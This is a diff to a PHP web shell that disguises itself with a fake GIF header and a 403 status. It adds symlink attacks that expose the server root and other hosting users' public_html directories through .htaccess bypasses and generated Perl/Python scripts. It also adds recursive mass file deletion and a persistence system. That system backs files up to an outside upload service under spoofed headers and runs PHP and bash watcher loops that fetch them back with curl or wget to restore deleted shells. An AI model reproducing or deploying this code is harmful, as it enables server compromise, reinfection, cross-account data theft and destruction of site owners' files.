@@ -1,7 +1,7 @@
 <?php
+ob_start();
 echo "<!-- GIF89;a -->\n";
 @ini_set('max_execution_time', 0);
-@ob_clean();
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
 @http_response_code(403);
@@ -366,6 +366,7 @@ function safeExec($cmd) {
 
 // === PROCESS AJAX HANDLER ===
 if (isset($_POST['proc_action']) && isAuthenticated()) {
+    ob_clean();
     header('Content-Type: application/json; charset=utf-8');
     $pAct = $_POST['proc_action'];
 
@@ -481,6 +482,7 @@ if (isset($_POST['proc_action']) && isAuthenticated()) {
 
 // === CRONJOB AJAX HANDLER ===
 if (isset($_POST['cron_action']) && isAuthenticated()) {
+    ob_clean();
     header('Content-Type: application/json; charset=utf-8');
     $crAct = $_POST['cron_action'];
 
@@ -634,22 +636,25 @@ if (isset($_POST['cron_action']) && isAuthenticated()) {
 
 // === FILE OPERATION AJAX HANDLER ===
 if (isset($_POST['file_action']) && isAuthenticated()) {
+    ob_clean();
     header('Content-Type: application/json; charset=utf-8');
     $fAct = $_POST['file_action'];
     $fPath = $_POST['file_path'] ?? '';
 
     if ($fAct === 'get_content') {
         if (!file_exists($fPath) || !is_file($fPath)) {
-            echo json_encode(['err' => 'File not found']);
+            echo json_encode(array('err' => 'File not found'));
             exit;
         }
         $content = @file_get_contents($fPath);
-        echo json_encode(['ok' => true, 'content' => ($content !== false ? $content : ''), 'name' => basename($fPath)]);
+        if ($content === false) $content = '';
+        // base64 encode to safely transport any binary/encoding safely through JSON
+        echo json_encode(array('ok' => true, 'content' => base64_encode($content), 'encoded' => true, 'name' => basename($fPath)));
         exit;
     }
 
     if ($fAct === 'save_content') {
-        $content = $_POST['file_content'] ?? '';
+        $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
         if (empty($fPath)) { echo json_encode(['err' => 'No file path']); exit; }
         @chmod($fPath, is_dir($fPath) ? 0755 : 0644);
         @chmod(dirname($fPath), 0755);
@@ -733,50 +738,6 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             }
         }
         echo json_encode(['ok' => true, 'deleted' => $ok, 'failed' => $fail]);
-        exit;
-    }
-
-    if ($fAct === 'mass_delete_recursive') {
-        $code = $_POST['code_content'] ?? '';
-        $dir = $_POST['target_dir'] ?? '';
-        if (empty($dir)) { echo json_encode(['err' => 'Directory required']); exit; }
-        if (!is_dir($dir)) { echo json_encode(['err' => 'Not a directory']); exit; }
-        $ok = 0; $fail = 0; $scanned = 0;
-        try {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::CHILD_FIRST
-            );
-            foreach ($iterator as $item) {
-                if ($item->isFile()) {
-                    $scanned++;
-                    $shouldDelete = false;
-                    if (!empty($code)) {
-                        $fc = @file_get_contents($item->getPathname());
-                        if ($fc !== false && strpos($fc, $code) !== false) $shouldDelete = true;
-                    } else {
-                        $shouldDelete = true;
-                    }
-                    if ($shouldDelete) {
-                        @chmod($item->getPathname(), 0644);
-                        if (@unlink($item->getPathname())) $ok++; else $fail++;
-                    }
-                }
-            }
-            // Clean empty dirs if deleting all
-            if (empty($code)) {
-                $dirIter = new RecursiveIteratorIterator(
-                    new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-                    RecursiveIteratorIterator::CHILD_FIRST
-                );
-                foreach ($dirIter as $d) {
-                    if ($d->isDir()) { @chmod($d->getPathname(), 0755); @rmdir($d->getPathname()); }
-                }
-            }
-        } catch (Exception $e) {
-            echo json_encode(['err' => $e->getMessage()]); exit;
-        }
-        echo json_encode(['ok' => true, 'deleted' => $ok, 'failed' => $fail, 'scanned' => $scanned]);
         exit;
     }
 
@@ -969,24 +930,127 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
     }
 
     if ($fAct === 'create_symlink') {
-        $target = $_POST['symlink_target'] ?? '';
-        $linkName = $_POST['symlink_name'] ?? '';
-        $dir = $_POST['target_dir'] ?? '';
-        if (empty($target) || empty($linkName) || empty($dir)) {
-            echo json_encode(['err' => 'Target path, link name, and directory are required']); exit;
+        $symMode = isset($_POST['sym_mode']) ? $_POST['sym_mode'] : 'file';
+
+        // ── File/Dir symlink (like alfa SymFile) ──────────────────────────
+        if ($symMode === 'file') {
+            $target   = isset($_POST['symlink_target']) ? $_POST['symlink_target'] : '';
+            $linkName = isset($_POST['symlink_name'])   ? $_POST['symlink_name']   : '';
+            $dir      = isset($_POST['target_dir'])     ? $_POST['target_dir']     : '';
+            if (empty($target) || empty($linkName) || empty($dir)) {
+                echo json_encode(array('err' => 'Target path, link name, and directory are required')); exit;
+            }
+            $linkPath = rtrim($dir, '/') . '/' . $linkName;
+            if (file_exists($linkPath) || is_link($linkPath)) { @unlink($linkPath); }
+            $ok = false;
+            if (function_exists('symlink')) { $ok = @symlink($target, $linkPath); }
+            if (!$ok) {
+                $cmd = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($linkPath);
+                @shell_exec($cmd); @exec($cmd); @system($cmd); @passthru($cmd);
+                $ok = is_link($linkPath);
+            }
+            if ($ok) {
+                $url = getFileUrl($linkPath);
+                echo json_encode(array('ok' => true, 'msg' => 'Symlink created: ' . $linkName . ' -> ' . $target, 'url' => $url));
+            } else {
+                $err = error_get_last();
+                echo json_encode(array('err' => 'Failed to create symlink' . ($err ? ': ' . $err['message'] : '')));
+            }
+            exit;
         }
-        @chmod($dir, 0755);
-        $linkPath = rtrim($dir, '/') . '/' . $linkName;
-        if (file_exists($linkPath) || is_link($linkPath)) {
-            echo json_encode(['err' => 'A file or link with that name already exists']); exit;
+
+        // ── Symlink PHP (like alfa symphp) — sym root, list all domains ──
+        if ($symMode === 'symphp') {
+            $dataDir = dirname(__FILE__) . '/alfasymlink';
+            @mkdir($dataDir, 0777, true);
+            // Write .htaccess bypass to allow direct access
+            $htaccess = $dataDir . '/.htaccess';
+            if (!file_exists($htaccess)) {
+                @file_put_contents($htaccess, "Options +Indexes\nOptions +FollowSymLinks\nDirectoryIndex None\n");
+            }
+            // Create symlink root -> /
+            $rootLink = $dataDir . '/root';
+            if (!is_link($rootLink)) {
+                $ok = false;
+                if (function_exists('symlink')) $ok = @symlink('/', $rootLink);
+                if (!$ok) { @shell_exec("ln -s / " . escapeshellarg($rootLink)); @exec("ln -s / " . escapeshellarg($rootLink)); $ok = is_link($rootLink); }
+            } else { $ok = true; }
+            // Read domains from server
+            $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
+            $scriptPath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);
+            $scriptDir  = dirname($scriptPath);
+            $symlinkBase = $baseUrl . $scriptDir . '/alfasymlink/root';
+            $rows = array();
+            // Try /etc/named.conf or /etc/valiases
+            $domains = array(); $state = '';
+            if (@file_exists('/etc/named.conf') && @is_readable('/etc/named.conf')) {
+                $lines = @file('/etc/named.conf', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+                if ($lines) { foreach ($lines as $l) { if (preg_match('#zone\s+"([^"]+)"#', $l, $m)) $domains[] = $m[1]; } $state = 'named.conf'; }
+            }
+            if (empty($domains)) {
+                $valiases = @scandir('/etc/valiases');
+                if ($valiases) { foreach ($valiases as $v) { if ($v !== '.' && $v !== '..') $domains[] = $v; } $state = 'valiases'; }
+            }
+            if (empty($domains)) {
+                $named = @scandir('/var/named');
+                if ($named) { foreach ($named as $v) { if ($v !== '.' && $v !== '..') $domains[] = rtrim($v, '.db'); } $state = 'named'; }
+            }
+            // Build domain rows
+            if (!empty($domains)) {
+                foreach ($domains as $dom) {
+                    $dom = trim($dom);
+                    if (strlen($dom) < 3) continue;
+                    // Guess public_html path
+                    $owner = '';
+                    if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
+                        $f = '/etc/valiases/' . $dom;
+                        if (@file_exists($f)) { $pw = @posix_getpwuid(@fileowner($f)); $owner = $pw ? $pw['name'] : ''; }
+                    }
+                    if (!$owner) { $owner = strtok($dom, '.'); }
+                    $pubPath = '/home/' . $owner . '/public_html';
+                    $symPath = $symlinkBase . $pubPath;
+                    $rows[] = array('domain' => $dom, 'owner' => $owner, 'path' => $pubPath, 'url' => $symPath);
+                }
+            }
+            echo json_encode(array('ok' => $ok, 'rows' => $rows, 'root_url' => $symlinkBase, 'msg' => $ok ? 'Root symlink ready' : 'symlink() disabled — trying shell'));
+            exit;
         }
-        if (@symlink($target, $linkPath)) {
-            echo json_encode(['ok' => true, 'msg' => 'Symlink created: ' . $linkName . ' -> ' . $target]);
-        } else {
-            $err = error_get_last();
-            echo json_encode(['err' => 'Failed to create symlink' . ($err ? ': ' . $err['message'] : '')]);
+
+        // ── Symlink Perl / Python (like alfa symperl/sympy) ──────────────
+        if ($symMode === 'symperl' || $symMode === 'sympy') {
+            $dataDir = dirname(__FILE__) . '/cgialfa';
+            @mkdir($dataDir, 0777, true);
+            $htaccess = $dataDir . '/.htaccess';
+            if (!file_exists($htaccess)) {
+                @file_put_contents($htaccess, "Options +ExecCGI\nAddHandler cgi-script .alfa .pl .py\nOptions +FollowSymLinks\n");
+            }
+            $makepwd = "/home/{user}/public_html/";
+            $lang = ($symMode === 'sympy') ? 'python' : 'perl';
+            // Try to run via exec
+            $canRun = false;
+            foreach (array('system','exec','shell_exec','passthru') as $fn) { if (function_exists($fn)) { $canRun = true; break; } }
+            $out = '';
+            if ($canRun) {
+                $tmpFile = $dataDir . '/' . $lang . '_sym_' . rand(1000,9999) . ($lang === 'perl' ? '.pl' : '.py');
+                if ($lang === 'perl') {
+                    $code = "#!/usr/bin/perl\nuse strict;\nmy \$path = \"$makepwd\";\nopen(F,'</etc/passwd') or die;\nwhile(<F>){ chomp;\nmy @f=split(/:/,\$_); my \$u=\$f[0]; my \$id=\$f[2];\nnext if \$id < 500;\nmy \$p=\$path; \$p=~s/\\{user\\}/\$u/g;\nif(-d \$p){ symlink(\$p,\"" . $dataDir . "/\$u\"); print \"[+] \$u => \$p\\n\"; }\n}\nclose F;\n";
+                } else {
+                    $code = "#!/usr/bin/python\nimport os,re\npath = \"$makepwd\"\ntry:\n  f=open('/etc/passwd')\n  for line in f:\n    parts=line.strip().split(':')\n    if len(parts)<3: continue\n    u=parts[0]; uid=int(parts[2])\n    if uid < 500: continue\n    p=path.replace('{user}',u)\n    if os.path.isdir(p):\n      try: os.symlink(p,\"" . $dataDir . "/\"+u); print('[+] '+u+' => '+p)\n      except: pass\nexcept: pass\n";
+                }
+                @file_put_contents($tmpFile, $code);
+                @chmod($tmpFile, 0755);
+                if (function_exists('exec')) { @exec("$lang $tmpFile 2>&1", $lines_out); $out = implode("\n", $lines_out); }
+                elseif (function_exists('shell_exec')) { $out = @shell_exec("$lang $tmpFile 2>&1"); }
+                elseif (function_exists('system')) { ob_start(); @system("$lang $tmpFile 2>&1"); $out = ob_get_clean(); }
+                @unlink($tmpFile);
+            }
+            $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
+            $scriptDir = dirname(str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__));
+            echo json_encode(array('ok' => true, 'output' => $out ?: 'Executed (no output)', 'base_url' => $baseUrl . $scriptDir . '/cgialfa/'));
+            exit;
         }
-        exit;
+
+        echo json_encode(array('err' => 'Unknown sym_mode')); exit;
     }
 
     if ($fAct === 'backconnect') {
@@ -1068,6 +1132,742 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
     exit;
 }
 // === END FILE OPERATION HANDLER ===
+
+// === MASS DELETE BY CONTENT (form POST, result shown in terminal) ===
+if (isset($_POST['do_mass_delete']) && isAuthenticated()) {
+    $code = isset($_POST['code_content']) ? $_POST['code_content'] : '';
+    $dir  = isset($_POST['target_dir'])   ? trim($_POST['target_dir']) : '';
+    if (empty($dir)) $dir = dirname(__FILE__);
+    $keywords = array();
+    if (!empty($code)) {
+        foreach (explode("\n", $code) as $ln) {
+            $ln = trim($ln); if ($ln !== '') $keywords[] = $ln;
+        }
+    }
+    $ok = 0; $fail = 0; $scanned = 0; $deletedLines = '';
+    $massDelErr = '';
+    if (!is_dir($dir)) {
+        $massDelErr = "Error: Not a directory: " . $dir;
+    } else {
+        try {
+            $iterator = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::CHILD_FIRST
+            );
+            foreach ($iterator as $item) {
+                if (!$item->isFile()) continue;
+                $scanned++;
+                $del = false;
+                if (!empty($keywords)) {
+                    $fc = @file_get_contents($item->getPathname());
+                    if ($fc !== false) {
+                        foreach ($keywords as $kw) {
+                            if (strpos($fc, $kw) !== false) { $del = true; break; }
+                        }
+                    }
+                } else {
+                    $del = true;
+                }
+                if ($del) {
+                    @chmod($item->getPathname(), 0644);
+                    if (@unlink($item->getPathname())) {
+                        $ok++;
+                        $url = getFileUrl($item->getPathname());
+                        $deletedLines .= "  [DELETED] " . $item->getPathname();
+                        if ($url) $deletedLines .= "\n           " . $url;
+                        $deletedLines .= "\n";
+                    } else {
+                        $fail++;
+                        $deletedLines .= "  [FAILED]  " . $item->getPathname() . "\n";
+                    }
+                }
+            }
+            if (empty($keywords)) {
+                $dirIter = new RecursiveIteratorIterator(
+                    new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+                    RecursiveIteratorIterator::CHILD_FIRST
+                );
+                foreach ($dirIter as $d) {
+                    if ($d->isDir()) { @chmod($d->getPathname(), 0755); @rmdir($d->getPathname()); }
+                }
+            }
+        } catch (Exception $e) {
+            $massDelErr = "Exception: " . $e->getMessage();
+        }
+    }
+    if ($massDelErr) {
+        $cmdOutput = $massDelErr;
+    } else {
+        $kwLabel = !empty($keywords) ? implode(', ', $keywords) : '(ALL FILES)';
+        $cmdOutput  = "=== Mass Delete by Content ===\n";
+        $cmdOutput .= "Directory : " . $dir . "\n";
+        $cmdOutput .= "Keywords  : " . $kwLabel . "\n";
+        $cmdOutput .= "Scanned   : " . $scanned . " files\n";
+        $cmdOutput .= "Deleted   : " . $ok . " files\n";
+        $cmdOutput .= "Failed    : " . $fail . " files\n";
+        if ($deletedLines) $cmdOutput .= "\n" . $deletedLines;
+        else               $cmdOutput .= "\nNo matching files found.\n";
+    }
+    $responseMessage = 'Mass Delete selesai: ' . $ok . ' dihapus.';
+}
+// === END MASS DELETE ===
+
+// === LOCKFILE HANDLER ===
+// Lockstore format per line: path|perm|backup_url
+function lp_lock_load($lockStore) {
+    $entries = array();
+    if (!@file_exists($lockStore)) return $entries;
+    $lines = @file($lockStore, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (!$lines) return $entries;
+    foreach ($lines as $l) {
+        $l = trim($l); if (!$l) continue;
+        $parts = explode('|', $l, 3);
+        $entries[] = array(
+            'path'       => $parts[0],
+            'perm'       => isset($parts[1]) ? $parts[1] : '0444',
+            'backup_url' => isset($parts[2]) ? $parts[2] : ''
+        );
+    }
+    return $entries;
+}
+function lp_lock_save($lockStore, $entries) {
+    $lines = array();
+    foreach ($entries as $e) {
+        $lines[] = $e['path'] . '|' . $e['perm'] . '|' . $e['backup_url'];
+    }
+    @file_put_contents($lockStore, $lines ? implode("\n", $lines) . "\n" : '');
+}
+function lp_upload_figma($filePath) {
+    if (!@file_exists($filePath) || is_dir($filePath)) return '';
+    $content = @file_get_contents($filePath);
+    if ($content === false || $content === '') return '';
+    $apiUrl  = 'https://help.figma.com/api/v2/uploads.json?filename=' . rawurlencode(basename($filePath));
+    $hdrs = array(
+        'Content-Type: application/octet-stream',
+        'Content-Length: ' . strlen($content),
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+        'Accept: */*',
+        'Accept-Language: en-US,en;q=0.9',
+        'Origin: https://upload.c99.nl',
+        'Referer: https://upload.c99.nl/',
+        'Sec-Fetch-Mode: cors',
+        'Sec-Fetch-Site: cross-site',
+    );
+    $resp = '';
+    // Try cURL first (most reliable, supports binary POST correctly)
+    if (function_exists('curl_init')) {
+        $ch = curl_init($apiUrl);
+        curl_setopt_array($ch, array(
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => $content,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 30,
+            CURLOPT_HTTPHEADER     => $hdrs,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_FOLLOWLOCATION => true,
+        ));
+        $resp = curl_exec($ch);
+        curl_close($ch);
+    }
+    // Fallback: stream context
+    if (!$resp) {
+        $ctx = @stream_context_create(array('http' => array(
+            'method'        => 'POST',
+            'header'        => implode("\r\n", $hdrs),
+            'content'       => $content,
+            'timeout'       => 30,
+            'ignore_errors' => true,
+        )));
+        $resp = @file_get_contents($apiUrl, false, $ctx);
+    }
+    if (!$resp) return '';
+    $json = @json_decode($resp, true);
+    if (!$json) return '';
+    $att = isset($json['upload']['attachment'])
+           ? $json['upload']['attachment']
+           : (isset($json['upload']['attachments'][0]) ? $json['upload']['attachments'][0] : null);
+    if (!$att) return '';
+    return isset($att['mapped_content_url']) ? $att['mapped_content_url']
+         : (isset($att['content_url'])        ? $att['content_url']        : '');
+}
+// Build PHP watcher script — works on Linux & Windows (no bash needed)
+function lp_build_php_watcher($phpWatchFile, $lockStore) {
+    $storeEsc = addslashes($lockStore);
+    $php  = "<?php\n";
+    $php .= "set_time_limit(0);\n";
+    $php .= "ignore_user_abort(true);\n";
+    $php .= "\$store = '" . $storeEsc . "';\n";
+    $php .= "\n";
+    // Inline helper: fetch URL content (curl -> stream fallback)
+    $php .= "function watcher_fetch(\$url) {\n";
+    $php .= "    if (function_exists('curl_init')) {\n";
+    $php .= "        \$ch = curl_init(\$url);\n";
+    $php .= "        curl_setopt_array(\$ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,\n";
+    $php .= "            CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,\n";
+    $php .= "            CURLOPT_USERAGENT=>'Mozilla/5.0'));\n";
+    $php .= "        \$r = curl_exec(\$ch); curl_close(\$ch);\n";
+    $php .= "        if (\$r !== false && \$r !== '') return \$r;\n";
+    $php .= "    }\n";
+    $php .= "    \$ctx = stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,\n";
+    $php .= "        'ignore_errors'=>true,'header'=>\"User-Agent: Mozilla/5.0\\r\\n\")));\n";
+    $php .= "    return @file_get_contents(\$url, false, \$ctx);\n";
+    $php .= "}\n";
+    $php .= "\n";
+    // Inline helper: upload file to Figma, return mapped_content_url
+    $php .= "function watcher_upload_figma(\$filePath) {\n";
+    $php .= "    if (!file_exists(\$filePath) || is_dir(\$filePath)) return '';\n";
+    $php .= "    \$raw = @file_get_contents(\$filePath);\n";
+    $php .= "    if (\$raw === false || \$raw === '') return '';\n";
+    $php .= "    \$apiUrl = 'https://help.figma.com/api/v2/uploads.json?filename=' . rawurlencode(basename(\$filePath));\n";
+    $php .= "    \$hdrs = array('Content-Type: application/octet-stream',\n";
+    $php .= "        'Content-Length: ' . strlen(\$raw),\n";
+    $php .= "        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n";
+    $php .= "        'Accept: */*', 'Origin: https://upload.c99.nl', 'Referer: https://upload.c99.nl/');\n";
+    $php .= "    \$resp = '';\n";
+    $php .= "    if (function_exists('curl_init')) {\n";
+    $php .= "        \$ch = curl_init(\$apiUrl);\n";
+    $php .= "        curl_setopt_array(\$ch, array(CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>\$raw,\n";
+    $php .= "            CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>30,\n";
+    $php .= "            CURLOPT_HTTPHEADER=>\$hdrs, CURLOPT_SSL_VERIFYPEER=>false));\n";
+    $php .= "        \$resp = curl_exec(\$ch); curl_close(\$ch);\n";
+    $php .= "    }\n";
+    $php .= "    if (!\$resp) {\n";
+    $php .= "        \$ctx = stream_context_create(array('http'=>array('method'=>'POST',\n";
+    $php .= "            'header'=>implode(\"\\r\\n\",\$hdrs), 'content'=>\$raw,\n";
+    $php .= "            'timeout'=>30, 'ignore_errors'=>true)));\n";
+    $php .= "        \$resp = @file_get_contents(\$apiUrl, false, \$ctx);\n";
+    $php .= "    }\n";
+    $php .= "    if (!\$resp) return '';\n";
+    $php .= "    \$j = @json_decode(\$resp, true);\n";
+    $php .= "    \$att = isset(\$j['upload']['attachment']) ? \$j['upload']['attachment']\n";
+    $php .= "         : (isset(\$j['upload']['attachments'][0]) ? \$j['upload']['attachments'][0] : null);\n";
+    $php .= "    if (!\$att) return '';\n";
+    $php .= "    return isset(\$att['mapped_content_url']) ? \$att['mapped_content_url']\n";
+    $php .= "         : (isset(\$att['content_url']) ? \$att['content_url'] : '');\n";
+    $php .= "}\n";
+    $php .= "\n";
+    // Inline helper: update backup_url for a path in the store file
+    $php .= "function watcher_update_store(\$store, \$target, \$newBakUrl) {\n";
+    $php .= "    \$lines = @file(\$store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);\n";
+    $php .= "    if (!\$lines) return;\n";
+    $php .= "    \$out = array();\n";
+    $php .= "    foreach (\$lines as \$l) {\n";
+    $php .= "        \$p = explode('|', \$l, 3);\n";
+    $php .= "        if (trim(\$p[0]) === \$target) {\n";
+    $php .= "            \$out[] = \$target . '|' . (isset(\$p[1]) ? trim(\$p[1]) : '0444') . '|' . \$newBakUrl;\n";
+    $php .= "        } else { \$out[] = \$l; }\n";
+    $php .= "    }\n";
+    $php .= "    @file_put_contents(\$store, implode(\"\\n\", \$out) . \"\\n\");\n";
+    $php .= "}\n";
+    $php .= "\n";
+    // Main watcher loop — every 1 second
+    $php .= "while (true) {\n";
+    $php .= "    if (!file_exists(\$store)) { sleep(1); continue; }\n";
+    $php .= "    \$lines = @file(\$store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);\n";
+    $php .= "    if (!\$lines) { sleep(1); continue; }\n";
+    $php .= "    foreach (\$lines as \$line) {\n";
+    $php .= "        \$line = trim(\$line); if (!\$line) continue;\n";
+    $php .= "        \$parts  = explode('|', \$line, 3);\n";
+    $php .= "        \$target = \$parts[0];\n";
+    $php .= "        \$perm   = isset(\$parts[1]) ? trim(\$parts[1]) : '0444';\n";
+    $php .= "        \$bakUrl = isset(\$parts[2]) ? trim(\$parts[2]) : '';\n";
+    $php .= "        \$permInt = octdec(\$perm);\n";
+    $php .= "        clearstatcache(true, \$target);\n";
+    $php .= "        if (!file_exists(\$target) && !is_link(\$target)) {\n";
+    $php .= "            // --- FILE MISSING: restore then re-upload ---\n";
+    $php .= "            \$content = '';\n";
+    $php .= "            if (\$bakUrl) { \$content = watcher_fetch(\$bakUrl); }\n";
+    $php .= "            // Ensure parent directory exists\n";
+    $php .= "            \$dir = dirname(\$target);\n";
+    $php .= "            if (!\$dir || !is_dir(\$dir)) { @mkdir(\$dir, 0755, true); }\n";
+    $php .= "            // Make parent writable temporarily\n";
+    $php .= "            \$dirPerm = @fileperms(\$dir);\n";
+    $php .= "            @chmod(\$dir, 0755);\n";
+    $php .= "            \$written = @file_put_contents(\$target, \$content !== false ? \$content : '');\n";
+    $php .= "            if (\$written !== false) { @chmod(\$target, \$permInt); }\n";
+    $php .= "            // Re-upload restored file to Figma to refresh backup URL\n";
+    $php .= "            if (\$written !== false && file_exists(\$target)) {\n";
+    $php .= "                \$newUrl = watcher_upload_figma(\$target);\n";
+    $php .= "                if (\$newUrl) { watcher_update_store(\$store, \$target, \$newUrl); }\n";
+    $php .= "            }\n";
+    $php .= "        } else {\n";
+    $php .= "            // --- FILE EXISTS: enforce chmod ---\n";
+    $php .= "            \$cur  = substr(sprintf('%o', @fileperms(\$target)), -4);\n";
+    $php .= "            \$want = str_pad(ltrim(\$perm, '0'), 4, '0', STR_PAD_LEFT);\n";
+    $php .= "            if (\$want === '0000') \$want = '0444';\n";
+    $php .= "            if (\$cur !== \$want) {\n";
+    $php .= "                // For enforcing read-only: no chmod writable needed first\n";
+    $php .= "                @chmod(\$target, \$permInt);\n";
+    $php .= "            }\n";
+    $php .= "        }\n";
+    $php .= "    }\n";
+    $php .= "    sleep(1);\n";
+    $php .= "}\n";
+    @file_put_contents($phpWatchFile, $php);
+    @chmod($phpWatchFile, 0755);
+}
+
+// Build a small PHP re-upload helper script called by bash watcher
+// Takes two args: $argv[1]=filePath, $argv[2]=storePath
+// Uploads file to Figma and updates the store, prints new URL
+function lp_build_reupload_helper($helperFile) {
+    $src  = '<?php' . "\n";
+    $src .= 'if (empty($argv[1]) || empty($argv[2])) exit;' . "\n";
+    $src .= '$filePath = $argv[1]; $store = $argv[2];' . "\n";
+    $src .= 'if (!file_exists($filePath) || is_dir($filePath)) exit;' . "\n";
+    $src .= '$raw = @file_get_contents($filePath);' . "\n";
+    $src .= 'if (!$raw) exit;' . "\n";
+    $src .= '$apiUrl = "https://help.figma.com/api/v2/uploads.json?filename=" . rawurlencode(basename($filePath));' . "\n";
+    $src .= '$hdrs = array("Content-Type: application/octet-stream","Content-Length: ".strlen($raw),"User-Agent: Mozilla/5.0","Accept: */*","Origin: https://upload.c99.nl","Referer: https://upload.c99.nl/");' . "\n";
+    $src .= '$resp = "";' . "\n";
+    $src .= 'if (function_exists("curl_init")) {' . "\n";
+    $src .= '    $ch = curl_init($apiUrl);' . "\n";
+    $src .= '    curl_setopt_array($ch, array(CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$raw,CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>30,CURLOPT_HTTPHEADER=>$hdrs,CURLOPT_SSL_VERIFYPEER=>false));' . "\n";
+    $src .= '    $resp = curl_exec($ch); curl_close($ch);' . "\n";
+    $src .= '}' . "\n";
+    $src .= 'if (!$resp) {' . "\n";
+    $src .= '    $ctx = stream_context_create(array("http"=>array("method"=>"POST","header"=>implode("\r\n",$hdrs),"content"=>$raw,"timeout"=>30,"ignore_errors"=>true)));' . "\n";
+    $src .= '    $resp = @file_get_contents($apiUrl, false, $ctx);' . "\n";
+    $src .= '}' . "\n";
+    $src .= 'if (!$resp) exit;' . "\n";
+    $src .= '$j = @json_decode($resp, true);' . "\n";
+    $src .= '$att = isset($j["upload"]["attachment"]) ? $j["upload"]["attachment"] : (isset($j["upload"]["attachments"][0]) ? $j["upload"]["attachments"][0] : null);' . "\n";
+    $src .= 'if (!$att) exit;' . "\n";
+    $src .= '$newUrl = isset($att["mapped_content_url"]) ? $att["mapped_content_url"] : (isset($att["content_url"]) ? $att["content_url"] : "");' . "\n";
+    $src .= 'if (!$newUrl) exit;' . "\n";
+    $src .= '// Update the store file' . "\n";
+    $src .= '$lines = @file($store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);' . "\n";
+    $src .= 'if (!$lines) { echo $newUrl; exit; }' . "\n";
+    $src .= '$out = array();' . "\n";
+    $src .= 'foreach ($lines as $l) {' . "\n";
+    $src .= '    $p = explode("|", $l, 3);' . "\n";
+    $src .= '    if (trim($p[0]) === $filePath) {' . "\n";
+    $src .= '        $out[] = $filePath . "|" . (isset($p[1]) ? trim($p[1]) : "0444") . "|" . $newUrl;' . "\n";
+    $src .= '    } else { $out[] = $l; }' . "\n";
+    $src .= '}' . "\n";
+    $src .= '@file_put_contents($store, implode("\n", $out) . "\n");' . "\n";
+    $src .= 'echo $newUrl;' . "\n";
+    @file_put_contents($helperFile, $src);
+    @chmod($helperFile, 0755);
+}
+
+// Build bash watcher — fallback for Linux (no PHP CLI inline required)
+function lp_build_bash_watcher($bashWatchFile, $lockStore, $helperFile) {
+    $sq  = escapeshellarg($lockStore);
+    $sqh = escapeshellarg($helperFile);
+    $sh  = "#!/bin/bash\n";
+    $sh .= "LOCKSTORE=" . $sq . "\n";
+    $sh .= "HELPER=" . $sqh . "\n";
+    $sh .= "while true; do\n";
+    $sh .= "  [ ! -f \"\$LOCKSTORE\" ] && sleep 1 && continue\n";
+    $sh .= "  while IFS='|' read -r TARGET PERM BKUP || [ -n \"\$TARGET\" ]; do\n";
+    $sh .= "    TARGET=\$(printf '%s' \"\$TARGET\" | tr -d '\\r')\n";
+    $sh .= "    PERM=\$(printf '%s' \"\$PERM\" | tr -d '\\r')\n";
+    $sh .= "    BKUP=\$(printf '%s' \"\$BKUP\" | tr -d '\\r')\n";
+    $sh .= "    [ -z \"\$TARGET\" ] && continue\n";
+    $sh .= "    if [ ! -e \"\$TARGET\" ] && [ ! -L \"\$TARGET\" ]; then\n";
+    $sh .= "      if [ -n \"\$BKUP\" ]; then\n";
+    $sh .= "        curl -sL --max-time 20 \"\$BKUP\" -o \"\$TARGET\" 2>/dev/null\n";
+    $sh .= "        [ ! -s \"\$TARGET\" ] && wget -qO \"\$TARGET\" \"\$BKUP\" 2>/dev/null\n";
+    $sh .= "      fi\n";
+    $sh .= "      [ ! -e \"\$TARGET\" ] && touch \"\$TARGET\" 2>/dev/null\n";
+    $sh .= "      chmod \"\$PERM\" \"\$TARGET\" 2>/dev/null\n";
+    $sh .= "      if command -v php >/dev/null 2>&1 && [ -f \"\$HELPER\" ] && [ -f \"\$TARGET\" ]; then\n";
+    $sh .= "        php \"\$HELPER\" \"\$TARGET\" \"\$LOCKSTORE\" > /dev/null 2>&1\n";
+    $sh .= "      fi\n";
+    $sh .= "    fi\n";
+    $sh .= "    if [ -e \"\$TARGET\" ]; then\n";
